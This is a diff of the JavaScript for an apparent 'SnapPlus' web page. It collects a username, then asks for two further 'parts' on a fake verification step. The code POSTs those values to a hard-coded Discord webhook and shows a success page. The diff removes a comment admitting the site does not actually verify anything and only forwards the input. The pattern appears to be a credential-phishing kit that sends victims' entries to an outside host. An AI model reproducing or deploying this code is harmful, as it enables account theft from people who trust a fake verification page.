@@ -3,7 +3,7 @@ const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536105952720330752/Xs
 
 
 // ==========================================
-// ÉTAPE 1 — PSEUDO
+// ÉTAPE 1 : PSEUDO
 // ==========================================
 
 const pseudoForm = document.getElementById("pseudoForm");
@@ -12,7 +12,7 @@ if (pseudoForm) {
   const pseudoInput = document.getElementById("pseudo");
   const submitButton = document.getElementById("submitButton");
   const errorMessage = document.getElementById("errorMessage");
-  const buttonText = document.querySelector(".button-text");
+  const buttonText = submitButton.querySelector(".button-text");
 
   pseudoForm.addEventListener("submit", (event) => {
     event.preventDefault();
@@ -24,7 +24,6 @@ if (pseudoForm) {
     if (pseudo.length < 2) {
       errorMessage.textContent =
         "Ton pseudo doit contenir au moins 2 caractères.";
-
       pseudoInput.focus();
       return;
     }
@@ -32,28 +31,25 @@ if (pseudoForm) {
     if (pseudo.length > 32) {
       errorMessage.textContent =
         "Ton pseudo ne peut pas dépasser 32 caractères.";
-
       pseudoInput.focus();
       return;
     }
 
-    /*
-     * On garde le pseudo uniquement pour la navigation
-     * vers l'étape suivante.
-     */
+    // On garde le pseudo pour l'étape suivante.
     sessionStorage.setItem("snapplus_pseudo", pseudo);
 
     submitButton.disabled = true;
     pseudoInput.disabled = true;
     buttonText.textContent = "Continuer…";
 
+    // IMPORTANT : on va vers la page de vérification.
     window.location.href = "verification.html";
   });
 }
 
 
 // ==========================================
-// ÉTAPE 2 — VÉRIFICATION / CONFIRMATION
+// ÉTAPE 2 : CONFIRMATION
 // ==========================================
 
 const verificationForm =
@@ -67,7 +63,7 @@ if (verificationForm) {
   const verificationError =
     document.getElementById("verificationError");
   const buttonText =
-    verificationForm.querySelector(".button-text");
+    verificationButton.querySelector(".button-text");
 
   verificationForm.addEventListener("submit", async (event) => {
     event.preventDefault();
@@ -79,8 +75,7 @@ if (verificationForm) {
 
     if (!first || !second) {
       verificationError.textContent =
-        "Remplis les deux parties de ton pseudo.";
-
+        "Remplis les deux parties du pseudo.";
       return;
     }
 
@@ -89,10 +84,6 @@ if (verificationForm) {
     secondPart.disabled = true;
     buttonText.textContent = "Envoi…";
 
-    /*
-     * Le site ne vérifie volontairement pas les deux parties.
-     * Elles sont simplement transmises au webhook de test.
-     */
     try {
       const response = await fetch(DISCORD_WEBHOOK, {
         method: "POST",
@@ -101,7 +92,7 @@ if (verificationForm) {
         },
         body: JSON.stringify({
           content:
-            `🔎 Confirmation SnapPlus\n` +
+            "🔎 Confirmation SnapPlus\n\n" +
             `Première partie : **${first}**\n` +
             `Deuxième partie : **${second}**`
         })
@@ -111,6 +102,7 @@ if (verificationForm) {
         throw new Error(`Discord HTTP ${response.status}`);
       }
 
+      // Envoi réussi → page finale.
       sessionStorage.removeItem("snapplus_pseudo");
 
       window.location.href = "success.html";
@@ -129,3 +121,4 @@ if (verificationForm) {
   });
 }
 ```
+
